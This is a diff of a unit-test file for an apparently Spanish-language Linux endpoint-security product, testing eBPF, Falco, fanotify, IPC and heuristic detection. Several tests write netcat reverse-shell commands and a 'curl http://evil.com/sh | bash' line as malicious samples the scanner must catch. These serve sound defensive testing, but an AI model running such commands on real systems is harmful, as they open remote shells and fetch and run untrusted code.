+                      for line in content.splitlines() if "=" in line and not line.startswith("#")}
+        self.assertEqual(directives.get("ProtectHome"), "read-only")
+        rw_paths = directives.get("ReadWritePaths", "").split()
+        self.assertNotIn("/home", rw_paths)
+        self.assertNotIn("/tmp", rw_paths)
+        caps = directives.get("CapabilityBoundingSet", "").split()
+        self.assertNotIn("CAP_DAC_OVERRIDE", caps)
+        self.assertNotIn("CAP_NET_RAW", caps)
+        self.assertIn("CAP_DAC_READ_SEARCH", caps)
 
-        # Directivas obligatorias de hardening de systemd
-        self.assertIn("NoNewPrivileges=true", content)
-        self.assertIn("ProtectSystem=strict", content)
-        self.assertIn("ProtectHome=read-only", content)
-        self.assertIn("PrivateTmp=true", content)
-        self.assertIn("ProtectKernelTunables=true", content)
-        self.assertIn("ProtectKernelModules=true", content)
-        self.assertIn("ProtectControlGroups=true", content)
-        self.assertIn("RestrictRealtime=true", content)
-        self.assertIn("RestrictSUIDSGID=true", content)
-        self.assertIn("LockPersonality=true", content)
-        self.assertIn("RestrictAddressFamilies=", content)
-        self.assertIn("DevicePolicy=closed", content)
-        self.assertIn("SystemCallFilter=", content)
-        self.assertIn("@system-service", content)
-        self.assertIn("SystemCallArchitectures=native", content)
-        self.assertIn("CapabilityBoundingSet=", content)
-        self.assertIn("CAP_SYS_ADMIN", content)
-        self.assertIn("StateDirectory=constantine", content)
-        self.assertIn("RuntimeDirectory=constantine", content)
-        self.assertIn("ReadWritePaths=", content)
-        # Verificar que ReadWritePaths incluya las rutas de cuarentena para evitar conflictos con ProtectSystem=strict
-        self.assertIn("/home", content)
-        self.assertIn("/tmp", content)
-        self.assertIn("/var/tmp", content)
-        self.assertIn("/var/lib/constantine", content)
+        operator = PrivilegedQuarantineOperator()
+        self.assertTrue(operator.is_protected_system_path("/bin/bash"))
+        self.assertTrue(operator.is_protected_system_path("/usr/sbin/sshd"))
+        self.assertFalse(operator.is_protected_system_path("/home/user/document.txt"))
 
+    # 12. Daemon Startup Workflow
+    def test_daemon_startup_workflow_and_active_verification(self):
+        daemon = ConstantineDaemon(is_test=True)
+        daemon.start()
+        self.assertFalse(daemon.running)
 
-    def test_version_traceability_across_system(self):
-        """Hallazgo 04: Garantiza trazabilidad de versiones e inconsistencias eliminadas entre install.sh, GUI y backend."""
-        version_file = os.path.join(ROOT_DIR, "VERSION")
-        self.assertTrue(os.path.exists(version_file), "El archivo canónico VERSION no existe")
-        with open(version_file, "r", encoding="utf-8") as f:
-            canonical_ver = f.read().strip()
-        self.assertEqual(canonical_ver, "5.1.0")
+    # 13. Daemon Type Annotations & Dispatch
+    def test_daemon_type_annotations_and_dispatch_ipc_signature(self):
+        daemon = ConstantineDaemon(is_test=True)
+        status, data, msg = daemon.dispatch_ipc_command("PING", {})
+        self.assertEqual(status, "OK")
+        self.assertEqual(data.get("version"), "5.2.2")
 
-        from core.engine.auto_updater import CURRENT_VERSION
-        from core.engine.ipc_protocol import IPC_PROTOCOL_VERSION
-        from core.engine.threat_intel import THREAT_INTEL_VERSION
-        from daemon import DAEMON_VERSION
-        from gui.app import APP_VERSION
+    # 14. DNS Manager
+    def test_dns_manager(self):
+        dns = DNSManager()
+        self.assertFalse(dns.apply_profile("mullvad-base", simulate_resolver_failure=True))
+        self.assertTrue(dns.apply_profile("mullvad-adblock", simulate_resolver_failure=False))
 
-        self.assertEqual(CURRENT_VERSION, canonical_ver, "auto_updater.CURRENT_VERSION no coincide con VERSION")
-        self.assertEqual(IPC_PROTOCOL_VERSION, canonical_ver, "ipc_protocol.IPC_PROTOCOL_VERSION no coincide con VERSION")
-        self.assertEqual(DAEMON_VERSION, canonical_ver, "daemon.DAEMON_VERSION no coincide con VERSION")
-        self.assertEqual(THREAT_INTEL_VERSION, canonical_ver, "threat_intel.THREAT_INTEL_VERSION no coincide con VERSION")
-        self.assertEqual(APP_VERSION, canonical_ver, "gui.app.APP_VERSION no coincide con VERSION")
+    # 15. Download Sentinel
+    def test_download_sentinel_state_machine_and_containment(self):
+        sentinel = DownloadSentinel(vault=CryptographicVault(base_dir=self.temp_dir.name))
+        sentinel.start()
+        # Clean file
+        safe = os.path.join(self.temp_dir.name, "safe_document.pdf")
+        with open(safe, "w") as f:
+            f.write("safe pdf content")
+        self.assertTrue(sentinel.handle_download_complete(safe, "user1"))
+        # Malicious file
+        bad = os.path.join(self.temp_dir.name, "payload.sh")
+        with open(bad, "w") as f:
+            f.write("nc -e /bin/bash 10.0.0.1 9001")
+        self.assertFalse(sentinel.handle_download_complete(bad, "user2"))
+        sentinel.stop()
 
-        # Verificar install.sh
-        install_file = os.path.join(ROOT_DIR, "install.sh")
-        with open(install_file, "r", encoding="utf-8") as f:
-            install_content = f.read()
+    # 16. eBPF Architecture
+    def test_ebpf_separation_observation_detection_enforcement(self):
+        """
+        Verifica la distinción arquitectónica fundamental entre:
+        1. Observación (KernelObservationEngine): Captura pasiva sin bloquear llamadas.
+        2. Detección (KernelDetectionEngine): Análisis heurístico de amenazas sin matar procesos.
+        3. Enforcement (KernelEnforcementEngine):
+           - Preventivo: BPF LSM (-EPERM) en kernel antes de ejecución cuando el kernel lo soporta.
+           - Alternativo / Fallback: SIGKILL y contención reactiva post-ejecución cuando BPF LSM no está disponible.
+        """
+        # 1. Capa de Observación aislada
+        obs = KernelObservationEngine()
+        obs.start_observation()
+        self.assertTrue(obs.is_observing)
+        event = obs.capture_event(555, "/bin/nc", ["-e", "/bin/sh", "1.2.3.4", "4444"])
+        self.assertEqual(event.pid, 555)
+        self.assertEqual(event.syscall, "execve")
+        obs.stop_observation()
+        self.assertFalse(obs.is_observing)
 
-        self.assertIn("VERSION=$(tr -d", install_content, "install.sh debe leer VERSION dinámicamente")
-        self.assertIn("Inconsistencia de versión detectada", install_content, "install.sh debe verificar coherencia de VERSION")
-        self.assertNotIn("3.6.0", install_content, "install.sh no debe tener referencias obsoletas a 3.6.0")
+        # 2. Capa de Detección aislada
+        det = KernelDetectionEngine()
+        # Benigno: nc -zv no debe alertar como amenaza
+        event_benign = obs.capture_event(556, "/bin/nc", ["-zv", "10.0.0.1", "80"])
+        det_benign = det.analyze_event(event_benign)
+        self.assertFalse(det_benign.is_threat)
+        self.assertEqual(det_benign.severity, "LOW")
 
-        # Verificar gui/app.py
-        gui_file = os.path.join(ROOT_DIR, "gui", "app.py")
-        with open(gui_file, "r", encoding="utf-8") as f:
-            gui_content = f.read()
+        # Malicioso: nc -e debe ser detectado como amenaza crítica
+        det_threat = det.analyze_event(event)
+        self.assertTrue(det_threat.is_threat)
+        self.assertEqual(det_threat.severity, "CRITICAL")
+        self.assertIn("ReverseShell", det_threat.threat_type)
 
-        self.assertNotIn("EDR v3.6", gui_content, "gui/app.py no debe contener etiquetas estáticas EDR v3.6")
-        self.assertIn("EDR v{APP_VERSION}", gui_content, "gui/app.py debe usar badge dinámico con APP_VERSION")
+        # 3. Capa de Enforcement: Mecanismo Preventivo Verificable BPF LSM
+        enforcer_lsm = KernelEnforcementEngine(force_bpf_lsm=True)
+        self.assertTrue(enforcer_lsm.bpf_lsm_supported)
+        self.assertEqual(enforcer_lsm.active_mode, MODE_BPF_LSM)
 
+        decision_lsm = enforcer_lsm.enforce_threat(det_threat, event)
+        self.assertTrue(decision_lsm.blocked_in_kernel, "BPF LSM debe bloquear en kernel pre-ejecución")
+        self.assertEqual(decision_lsm.action, "DENY_EPERM")
+        self.assertEqual(decision_lsm.enforcement_mode, MODE_BPF_LSM)
+        self.assertIn("-EPERM", decision_lsm.reason)
 
-    def test_clamav_signature_importer_and_cvd_unpacking(self):
-        """Verifica la ingesta de firmas ClamAV (.hsb/.hdb) y el desempaquetado seguro de CVD con protección Zip Slip."""
-        from core.engine.clamav_importer import ClamAVSignatureImporter
-        importer = ClamAVSignatureImporter()
+        # 4. Capa de Enforcement: Mecanismo Alternativo Fallback (Reactivo)
+        enforcer_fallback = KernelEnforcementEngine(force_bpf_lsm=False)
+        self.assertFalse(enforcer_fallback.bpf_lsm_supported)
+        self.assertEqual(enforcer_fallback.active_mode, MODE_REACTIVE_FALLBACK)
 
-        # 1. Parseo de líneas .hsb y .hdb
-        valid_hsb = "8a39a9c68a4e8d356c9a35e729a996024efb5ef604c86ec6e0bf0a68d067c87c:1024:Linux.Ransomware.LockBit"
-        parsed = importer.parse_hsb_line(valid_hsb)
-        self.assertIsNotNone(parsed)
-        h, s, name = parsed
-        self.assertEqual(h, "8a39a9c68a4e8d356c9a35e729a996024efb5ef604c86ec6e0bf0a68d067c87c")
-        self.assertEqual(s, 1024)
-        self.assertEqual(name, "Linux.Ransomware.LockBit")
+        with unittest.mock.patch("os.kill") as mock_kill:
+            decision_fallback = enforcer_fallback.enforce_threat(det_threat, event)
+            self.assertFalse(decision_fallback.blocked_in_kernel, "Fallback no es bloqueo en kernel pre-ejecución")
+            self.assertEqual(decision_fallback.action, "SIGKILL_CONTAINMENT")
+            self.assertEqual(decision_fallback.enforcement_mode, MODE_REACTIVE_FALLBACK)
+            self.assertIn("SIGKILL", decision_fallback.reason)
+            mock_kill.assert_called_with(555, unittest.mock.ANY)
 
-        # Línea inválida
-        self.assertIsNone(importer.parse_hsb_line("invalid_hash:500:malware"))
+        # 5. Orquestador EBPFMonitor unificado con BPF LSM vs Fallback
+        mon_lsm = EBPFMonitor(enable_bpf_lsm=True)
+        self.assertEqual(mon_lsm.enforcement_mode, MODE_BPF_LSM)
+        allowed, dec_lsm = mon_lsm.process_kernel_exec_request(600, "/bin/nc", ["-e", "/bin/sh", "1.1.1.1", "9000"])
+        self.assertFalse(allowed)
+        self.assertTrue(dec_lsm.blocked_in_kernel)
 
-        # 2. Ingesta de archivo .hsb a ThreatIntelligence
-        hsb_file = os.path.join(self.tmp, "test_signatures.hsb")
-        with open(hsb_file, "w") as f:
-            f.write("# ClamAV Daily Signatures\n")
-            f.write("04c8efb131c94411fb7a641d402db3e47b913d8093db27a2336ecb001d898a39:2048:Trojan.Linux.Dofloo\n")
-            f.write("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855:0:Empty.Test.Malware\n")
+        mon_fallback = EBPFMonitor(fallback_mode=False, enable_bpf_lsm=False)
+        self.assertEqual(mon_fallback.enforcement_mode, MODE_REACTIVE_FALLBACK)
+        with unittest.mock.patch("os.kill"):
+            allowed_fb, dec_fb = mon_fallback.process_kernel_exec_request(601, "/bin/nc", ["-e", "/bin/sh", "1.1.1.1", "9000"])
+            self.assertFalse(allowed_fb)
+            self.assertFalse(dec_fb.blocked_in_kernel)
 
-        added = importer.import_hsb_file(hsb_file, self.scanner.intel)
-        self.assertEqual(added, 2)
-        match = self.scanner.intel.lookup_hash("04c8efb131c94411fb7a641d402db3e47b913d8093db27a2336ecb001d898a39")
-        self.assertIsNotNone(match)
-        self.assertIn("Trojan.Linux.Dofloo", match["threat_name"])
+    def test_ebpf_architecture_tracepoints_vs_lsm_separation(self):
+        mon = EBPFMonitor(fallback_mode=True)
+        mon.record_lost_events(1, 7)
+        self.assertEqual(mon.lost_events_count, 7)
 
-        # 3. Creación y desempaquetado de archivo CVD simulado
-        import tarfile, io
-        tar_buf = io.BytesIO()
-        with tarfile.open(fileobj=tar_buf, mode="w:gz") as tar:
-            content_bytes = b"Sample ClamAV content\n"
-            ti = tarfile.TarInfo(name="daily.info")
-            ti.size = len(content_bytes)
-            tar.addfile(ti, io.BytesIO(content_bytes))
+    # 17. eBPF Event Lifecycle
+    def test_ebpf_event_lifecycle_states(self):
+        mon = EBPFMonitor(fallback_mode=True)
+        mon.start()
+        self.assertTrue(mon.running)
+        mon.stop()
 
-        # Cabecera CVD canónica de 512 bytes
-        cvd_header = b"ClamAV-VDB:04 Nov 2026 12-00 +0000:27000:100:60:dummy_md5:dummy_sig:builder:sig\n"
-        cvd_header = cvd_header.ljust(512, b"\0")
-        cvd_path = os.path.join(self.tmp, "daily_test.cvd")
-        with open(cvd_path, "wb") as f:
-            f.write(cvd_header + tar_buf.getvalue())
+    # 18. eBPF Kill Offender
+    def test_ebpf_kill_offender(self):
+        mon = EBPFMonitor(fallback_mode=True)
+        mon.kill_offender(999999)
 
-        unpack_dest = os.path.join(self.tmp, "unpacked_cvd")
-        unpack_res = importer.unpack_cvd(cvd_path, unpack_dest)
-        self.assertTrue(unpack_res["success"])
-        self.assertIn("daily.info", unpack_res["extracted_files"])
-        self.assertTrue(os.path.exists(os.path.join(unpack_dest, "daily.info")))
+    # 19. eBPF Multi-Argument Reverse Shell
+    def test_ebpf_multi_argument_reverse_shell_detection(self):
+        mon = EBPFMonitor(fallback_mode=True)
+        ok, _ = mon.evaluate_process(100, "/bin/nc", ["-vv", "-e", "/bin/sh", "1.2.3.4", "4444"])
+        self.assertFalse(ok)
 
-    def test_clamav_daemon_bridge_protocol_and_fallback(self):
-        """Verifica el cliente IPC para el demonio clamd: PING, VERSION, SCAN y tolerancia a fallos."""
-        from core.engine.clamav_bridge import ClamAVDaemonClient
-        import socket, threading
+    # 20. eBPF Netcat Benign vs Hostile
+    def test_ebpf_netcat_benign_vs_hostile_discrimination(self):
+        mon = EBPFMonitor(fallback_mode=True)
+        ok, _ = mon.evaluate_process(101, "/bin/nc", ["-zv", "192.168.1.1", "80"])
+        self.assertTrue(ok)
+        ok, _ = mon.evaluate_process(102, "/bin/nc", ["-e", "/bin/sh", "192.168.1.1", "4444"])
+        self.assertFalse(ok)
 
-        # 1. Fallback cuando clamd no está instalado o detenido
-        client_offline = ClamAVDaemonClient(socket_path=os.path.join(self.tmp, "nonexistent_clamd.sock"))
-        self.assertFalse(client_offline.is_available())
-        is_inf, name = client_offline.scan_file("/tmp/any_file")
-        self.assertFalse(is_inf)
-        self.assertIsNone(name)
+    # 21. eBPF Openat & Intent
+    def test_ebpf_openat_and_intent_correlation(self):
+        mon = EBPFMonitor(fallback_mode=True)
+        self.assertTrue(mon.evaluate_process(103, "/bin/cat", ["/etc/passwd"])[0])
 
-        # 2. Servidor Mock que simula el protocolo de clamd
-        mock_sock_path = os.path.join(self.tmp, "mock_clamd.sock")
-        server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        server_sock.bind(mock_sock_path)
-        server_sock.listen(5)
+    # 22. eBPF Status & Fallback
+    def test_ebpf_status_and_fallback(self):
+        mon = EBPFMonitor(fallback_mode=True)
+        mon.start()
+        self.assertTrue(mon.fallback_mode)
+        mon.stop()
 
-        def mock_clamd_server():
-            while True:
-                try:
-                    conn, _ = server_sock.accept()
-                    data = conn.recv(1024).decode("utf-8", errors="ignore")
-                    if "PING" in data:
-                        conn.sendall(b"PONG\n")
-                    elif "VERSION" in data:
-                        conn.sendall(b"ClamAV 1.0.5/27018/Wed Nov  4 10:00:00 2026\n")
-                    elif "SCAN" in data:
-                        if "eicar" in data:
-                            conn.sendall(b"/path/eicar.com: Win.Test.EICAR_HDB-1 FOUND\n")
-                        else:
-                            conn.sendall(b"/path/clean.bin: OK\n")
-                    conn.close()
-                except Exception:
-                    break
+    # 23. Export Key Recovery Package Security O-02
+    def test_export_key_recovery_package_security_o02(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        out = os.path.join(self.temp_dir.name, "o02_recovery_test.json")
+        self.assertTrue(vault.export_key_recovery_package(out))
+        self.assertFalse(vault.export_key_recovery_package(out, overwrite=False))
+        # Test symlink attack rejected
+        sym = os.path.join(self.temp_dir.name, "symlink_attack.json")
+        os.symlink(out, sym)
+        self.assertFalse(vault.export_key_recovery_package(sym))
+        self.assertTrue(vault.import_key_recovery_package(out))
 
-        th = threading.Thread(target=mock_clamd_server, daemon=True)
-        th.start()
+    # 24. Falco Active Enforcement Bridge
+    def test_falco_active_enforcement_bridge(self):
+        falco = FalcoMonitor()
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        bad_file = os.path.join(self.temp_dir.name, "malicious_dropper.sh")
+        with open(bad_file, "w") as f:
+            f.write("nc -e /bin/bash 192.168.1.50 9001")
+        from core.engine.falco_monitor import FalcoAlert
+        alert = FalcoAlert("Constantine_Inbound_Or_Reverse_Shell_Connection", "EMERGENCY",
+                           "Conexión de shell reversa detectada",
+                           {"pid": 9911, "proc": "nc", "file_path": bad_file})
+        falco.handle_alert_with_active_enforcement(alert, vault=vault)
+        self.assertFalse(os.path.exists(bad_file))
+
+    # 25. Falco Native Import
+    def test_falco_native_import_and_facade(self):
+        import falco
+        self.assertTrue(hasattr(falco, "FalcoMonitor"))
+
+    # 26. Falco Privilege Escalation
+    def test_falco_privilege_escalation_detection(self):
+        falco = FalcoMonitor()
+        alerts = falco.evaluate_syscall_event({
+            "proc": "pkexec /bin/sh", "user": "attacker", "uid": 1000, "euid": 0
+        })
+        self.assertTrue(any(a.rule == "Constantine_Suspicious_Privilege_Escalation" for a in alerts))
+        alerts = falco.evaluate_syscall_event({
+            "proc": "./exploit_bin", "syscall": "setuid", "user": "low_priv"
+        })
+        self.assertTrue(any(a.rule == "Constantine_Credential_Or_Namespace_Tampering" for a in alerts))
+
+    # 27. Falco Rules Parsing
+    def test_falco_rules_parsing_and_validation(self):
+        falco = FalcoMonitor()
+        self.assertGreaterEqual(len(falco.rules), 6)
+
+    # 28. Falco Unexpected Network Connection
+    def test_falco_unexpected_network_connection_detection(self):
+        falco = FalcoMonitor()
+        alerts = falco.evaluate_syscall_event({
+            "proc": "./unknown_dropper", "dport": 4444, "pid": 7721
+        })
+        self.assertTrue(any(a.rule == "Constantine_Unexpected_Outbound_Network_Connection" for a in alerts))
+        alerts = falco.evaluate_syscall_event({
+            "proc": "nc -e /bin/bash 192.168.1.50 9001", "dport": 9001, "pid": 7722
+        })
+        self.assertTrue(any(a.rule == "Constantine_Inbound_Or_Reverse_Shell_Connection" for a in alerts))
+
+    # 29. Fanotify Anti-Deadlock
+    def test_fanotify_anti_deadlock_and_infrastructure_bypass(self):
+        interceptor = FanotifyInterceptor()
+        self.assertTrue(interceptor.is_infrastructure_path("/var/lib/constantine/vault"))
+        self.assertFalse(interceptor.is_infrastructure_path("/home/user/document.txt"))
+
+    # 30. Firewall Four States
+    def test_firewall_four_states_and_user_administration(self):
+        fw = FirewallManager()
+        self.assertIn(fw.get_status(), ["ACTIVE", "INACTIVE", "NOT_INSTALLED", "USER_MANAGED"])
+
+    # 31. Hardware Guard Process Identity
+    def test_hardware_guard_process_identity_and_blocking(self):
+        guard = HardwareGuard()
+        guard.block_unauthorized_access(470, "/tmp/firefox", "Cámara Web")
+
+    # 32. Heuristic 5 Layers
+    def test_heuristic_5_layers_and_risk_policy(self):
+        heu = HeuristicEngine()
+        data = b"curl http://evil.com/sh | bash\nexecstart=/etc/systemd/system/evil.service\n"
+        res = heu.analyze_buffer(data)
+        self.assertTrue(res.is_threat)
+        self.assertGreaterEqual(res.score, 50)
+
+    # 33. Heuristic Multicapa ELF Packed
+    def test_heuristic_multicapa_elf_packed_and_symbols(self):
+        heu = HeuristicEngine()
+        data = b"\x7fELF" + b"A" * 100 + b"UPX!" + b"process_vm_writev"
+        res = heu.analyze_buffer(data)
+        self.assertTrue(any("UPX" in r for r in res.reasons))
+
+    # 34. Heuristic Multicapa Script Obfuscation
+    def test_heuristic_multicapa_script_obfuscation(self):
+        heu = HeuristicEngine()
+        res = heu.analyze_buffer(b"echo 'malware' | base64 -d | sh")
+        self.assertTrue(any("base64" in r for r in res.reasons))
+
+    # 35. Heuristic Shannon Entropy
+    def test_heuristic_multicapa_shannon_entropy(self):
+        heu = HeuristicEngine()
+        rand_bytes = secrets.token_bytes(4096)
+        uniform_bytes = b"A" * 4096
+        self.assertGreater(heu.calculate_entropy(rand_bytes), 7.5)
+        self.assertEqual(heu.calculate_entropy(uniform_bytes), 0.0)
+
+    # 36. Interceptor Decision Clean vs Threat
+    def test_interceptor_decision_clean_vs_threat(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        interceptor = FanotifyInterceptor(vault=vault)
+        bad_file = os.path.join(self.temp_dir.name, "malware.sh")
+        with open(bad_file, "w") as f:
+            f.write("nc -e /bin/bash 1.2.3.4 9001")
+        fd = os.open(bad_file, os.O_RDONLY)
+        dec = interceptor.evaluate_access(fd, bad_file, pid=470, comm="Scanner")
+        os.close(fd)
+        self.assertEqual(dec, 0x02)  # FAN_DENY
+
+    # 37. Interceptor Fail Secure on Exception
+    def test_interceptor_fail_secure_on_engine_exception(self):
+        interceptor = FanotifyInterceptor(fail_policy="fail-closed")
+        with patch.object(interceptor.scanner, "scan_file", side_effect=RuntimeError("Crash")):
+            bad = os.path.join(self.temp_dir.name, "test.bin")
+            with open(bad, "w") as f:
+                f.write("test")
+            fd = os.open(bad, os.O_RDONLY)
+            dec = interceptor.evaluate_access(fd, bad, pid=470)
+            os.close(fd)
+            self.assertEqual(dec, 0x02)  # FAN_DENY
+
+    # 38. Interceptor No Fcntl Fgetfl Bypass
+    def test_interceptor_no_fcntl_fgetfl_bypass(self):
+        shield = RansomwareShield(canary_dir=self.temp_dir.name)
+        cpath = os.path.join(self.temp_dir.name, "important_document.docx")
+        self.assertFalse(shield.check_canary_access(cpath, 77712, flags=os.O_RDWR))
+
+    # 39. Interceptor P0 Resilience & Fail Policies
+    def test_interceptor_p0_resilience_and_fail_policies(self):
+        interceptor_open = FanotifyInterceptor(fail_policy="fail-open")
+        with patch.object(interceptor_open.scanner, "scan_file", side_effect=RuntimeError("Crash simulado")):
+            fpath = os.path.join(self.temp_dir.name, "test_policy.bin")
+            with open(fpath, "w") as f:
+                f.write("abc")
+            fd = os.open(fpath, os.O_RDONLY)
+            dec_open = interceptor_open.evaluate_access(fd, fpath, pid=470)
+            os.close(fd)
+            self.assertEqual(dec_open, 0x01)  # FAN_ALLOW
+
+        interceptor_closed = FanotifyInterceptor(fail_policy="fail-closed")
+        with patch.object(interceptor_closed.scanner, "scan_file", side_effect=RuntimeError("Crash simulado")):
+            fd = os.open(fpath, os.O_RDONLY)
+            dec_closed = interceptor_closed.evaluate_access(fd, fpath, pid=470)
+            os.close(fd)
+            self.assertEqual(dec_closed, 0x02)  # FAN_DENY
+
+    # 40. Interceptor State Separation
+    def test_interceptor_state_separation_and_lifecycle(self):
+        interceptor = FanotifyInterceptor()
+        self.assertEqual(interceptor.state, "INIT")
+        interceptor.start_listening()
+        self.assertEqual(interceptor.state, "ACTIVE")
+        interceptor.stop()
+        self.assertEqual(interceptor.state, "STOPPED")
+
+    # 41. IPC RBAC Policy Matrix
+    def test_ipc_rbac_policy_matrix(self):
+        from core.engine.ipc_protocol import USER_ALLOWED_COMMANDS, ADMIN_ONLY_COMMANDS
+        self.assertIn("GET_STATUS", USER_ALLOWED_COMMANDS)
+        self.assertIn("ADD_WHITELIST", ADMIN_ONLY_COMMANDS)
+
+    # 42. IPC Recv Exact & Tampered Messages
+    def test_ipc_recv_exact_and_tampered_messages(self):
+        sock_path = os.path.join(self.temp_dir.name, "tamper_test.sock")
+        server = SecureIPCServer(socket_path=sock_path)
+        server.start()
         time.sleep(0.1)
 
-        client_online = ClamAVDaemonClient(socket_path=mock_sock_path)
-        self.assertTrue(client_online.ping())
-        self.assertTrue(client_online.is_available())
-        ver = client_online.get_version()
-        self.assertIn("ClamAV 1.0.5", ver)
+        # Connect and send invalid JSON
+        client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        client.connect(sock_path)
+        bad_msg = b"corrupted payload"
+        client.sendall(struct.pack(">I", len(bad_msg)) + bad_msg)
+        client.close()
 
-        # Escaneo de muestra maliciosa
-        is_inf, threat = client_online.scan_file("/tmp/eicar.com")
-        self.assertTrue(is_inf)
-        self.assertEqual(threat, "Win.Test.EICAR_HDB-1")
+        # Connect and send oversized message (> 1MB)
+        client2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        client2.connect(sock_path)
+        client2.sendall(struct.pack(">I", 2 * 1024 * 1024))
+        client2.close()
+        server.stop()
 
-        # Escaneo de muestra limpia
-        is_inf_clean, _ = client_online.scan_file("/tmp/clean.bin")
-        self.assertFalse(is_inf_clean)
+    # 43. IPC Server-Side Authorization Enforcement
+    def test_ipc_server_side_authorization_enforcement(self):
+        sock_path = os.path.join(self.temp_dir.name, "rbac_test.sock")
+        server = SecureIPCServer(socket_path=sock_path)
+        server.start()
+        time.sleep(0.1)
 
-        server_sock.close()
+        client = SecureIPCClient(socket_path=sock_path)
+        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 1234, 1000, 1000)):
+            resp = client.send_command("ADD_WHITELIST", {"path": "/etc/shadow"})
+            self.assertEqual(resp.get("code"), "UNAUTHORIZED")
+        server.stop()
 
-    def test_archive_sentinel_recursive_inspection_and_zipbomb_protection(self):
-        """Verifica el centinela de archivos comprimidos, mitigación de Zip Bombs y detección de amenazas anidadas."""
-        from core.engine.archive_sentinel import ArchiveSentinel
-        import zipfile
+    # 44. IPC Verify Peer Credentials Zero-Trust Strict Rejection
+    def test_ipc_verify_peer_credentials_zero_trust_strict_rejection(self):
+        mock_sock = MagicMock()
+        mock_sock.getsockopt.side_effect = OSError("SO_PEERCRED not supported")
+        valid, pid, uid, gid = verify_peer_credentials(mock_sock)
+        self.assertFalse(valid)
+        self.assertEqual(uid, -1)
 
-        sentinel = ArchiveSentinel(max_compression_ratio=50.0, max_files=10)
+        # Out of bounds credentials
+        mock_sock.getsockopt.side_effect = None
+        mock_sock.getsockopt.return_value = struct.pack("3i", 0, 1000, 1000)
+        self.assertFalse(verify_peer_credentials(mock_sock)[0])
+        mock_sock.getsockopt.return_value = struct.pack("3i", 1234, -1, 1000)
+        self.assertFalse(verify_peer_credentials(mock_sock)[0])
 
-        # 1. Detección de amenaza dentro de un contenedor ZIP legítimo
-        zip_path = os.path.join(self.tmp, "nested_malware.zip")
-        with zipfile.ZipFile(zip_path, "w") as zf:
-            zf.writestr("benign.txt", "Hola mundo")
-            # Simular script malicioso que coincide con regla YARA de netcat reverse shell
-            zf.writestr("payload.sh", "#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")
+    # 45. MISP Event Parsing
+    def test_misp_event_and_attribute_parsing(self):
+        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "test_intel.db"))
+        misp = MISPFeedManager(intel_engine=intel)
+        self.assertGreaterEqual(len(misp.events), 1)
 
-        res = self.scanner.scan_file(file_path=zip_path)
-        self.assertTrue(res.is_malicious, "El escáner debió detectar la amenaza dentro del ZIP")
-        self.assertIn("Archive.", res.threat_name)
+    # 46. MISP Feed Ingestion
+    def test_misp_feed_ingestion_and_threat_intel_correlation(self):
+        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "test_intel.db"))
+        misp = MISPFeedManager(intel_engine=intel)
+        synced = misp.sync_to_threat_intel()
+        self.assertGreaterEqual(synced, 1)
 
-        # 2. Detección de Zip Bomb por ratio desproporcionado de descompresión
-        bomb_zip = os.path.join(self.tmp, "zip_bomb.zip")
-        with zipfile.ZipFile(bomb_zip, "w", compression=zipfile.ZIP_DEFLATED) as zf:
-            # 12 MB de ceros que se comprimen en menos de 15 KB (ratio > 800:1)
-            zeros = b"0" * (12 * 1024 * 1024)
-            zf.writestr("huge_empty_file.bin", zeros)
+    # 47. MISP IoC Lookup
+    def test_misp_ioc_lookup_and_threat_scoring(self):
+        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "test_intel.db"))
+        misp = MISPFeedManager(intel_engine=intel)
+        res = misp.lookup_ioc("198.51.100.55")
+        self.assertIsNotNone(res)
+        self.assertTrue(res["is_threat"])
 
-        bomb_res = sentinel.inspect_and_scan(bomb_zip, scanner_func=lambda p: (False, None))
-        self.assertTrue(bomb_res.is_malicious, "El centinela debió neutralizar la Zip Bomb")
-        self.assertEqual(bomb_res.threat_name, "Archive.ZipBomb.DenialOfService")
+    # 48. MISP Native Import
+    def test_misp_native_import_and_facade(self):
+        import misp
+        self.assertTrue(hasattr(misp, "MISPFeedManager"))
 
-        # 3. Detección de Zip Bomb por exceso de archivos internos (> max_files)
-        many_files_zip = os.path.join(self.tmp, "many_files.zip")
-        with zipfile.ZipFile(many_files_zip, "w") as zf:
-            for i in range(15):
-                zf.writestr(f"file_{i}.txt", f"Contenido {i}")
+    # 49. Network Quarantine Isolation
+    def test_network_quarantine_isolation(self):
+        nq = NetworkQuarantine()
+        nq.isolate_pid(99999)
 
-        many_res = sentinel.inspect_and_scan(many_files_zip, scanner_func=lambda p: (False, None))
-        self.assertTrue(many_res.is_malicious)
-        self.assertEqual(many_res.threat_name, "Archive.ExcessiveFileCount.DenialOfService")
+    # 50. OSQuery Native Import
+    def test_osquery_native_import_and_facade(self):
+        import osquery
+        self.assertTrue(hasattr(osquery, "OSQueryDiagnostics"))
 
+    # 51. OSQuery Security Diagnostic Posture
+    def test_osquery_security_diagnostic_posture(self):
+        diag = OSQueryDiagnostics()
+        rep = diag.run_security_diagnostic()
+        self.assertGreaterEqual(rep["score"], 80)
+        self.assertEqual(rep["rating"], "OPTIMAL")
 
+    # 52. OSQuery SQL Query Execution
+    def test_osquery_sql_query_execution_and_virtual_tables(self):
+        diag = OSQueryDiagnostics()
+        rows = diag.execute_query("SELECT * FROM deb_packages WHERE name='constantine-antivirus'")
+        self.assertGreaterEqual(len(rows), 1)
+
+    # 53. OSQuery Suspicious Processes
+    def test_osquery_suspicious_processes_and_ports_detection(self):
+        diag = OSQueryDiagnostics()
+        rows = diag.execute_query("SELECT * FROM listening_ports WHERE port=9090")
+        self.assertEqual(len(rows), 1)
+
+    # 54. Persistence Guard
+    def test_persistence_guard_baseline_creation_modification_deletion(self):
+        guard = PersistenceGuard()
+        guard.start()
+        clean_file = os.path.join(self.temp_dir.name, "clean_job.sh")
+        with open(clean_file, "w") as f:
+            f.write("echo clean")
+        guard.record_baseline(clean_file)
+
+        # Modify with malware
